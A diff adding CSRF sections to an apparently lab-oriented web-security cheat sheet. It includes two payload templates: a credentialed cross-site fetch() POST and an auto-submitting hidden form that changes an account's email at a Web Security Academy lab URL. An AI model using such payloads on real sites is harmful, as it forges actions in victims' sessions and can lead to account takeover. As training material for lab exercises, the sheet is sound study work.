@@ -39,6 +39,35 @@ Fuzzing list [here](https://raw.githubusercontent.com/danielmiessler/SecLists/ma
 ```
 ### Cross-site scripting (XSS)
 ### Cross-site request forge (CSRF)
+#### CSRF using Javascript fetch()
+```
+<html>
+  <script>
+    fetch("https://example.com", {
+      method: "POST",
+      credentials: "include",
+      mode: "cors",
+      body: JSON.stringify(donnees),
+      headers: {
+            "Content-Type": "application/json",
+            // 'Content-Type': 'application/x-www-form-urlencoded',
+          },
+    });
+  </script>
+</html>
+```
+#### CSRF using Javascript XMLHTTPRequest()
+#### CSRF using Javascript HTML
+```
+<html>
+  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</html>
+```
 ### Cross-origin resource sharing (CORS)
 ### Clickjacking
 ### DOM-based vulnerabilities
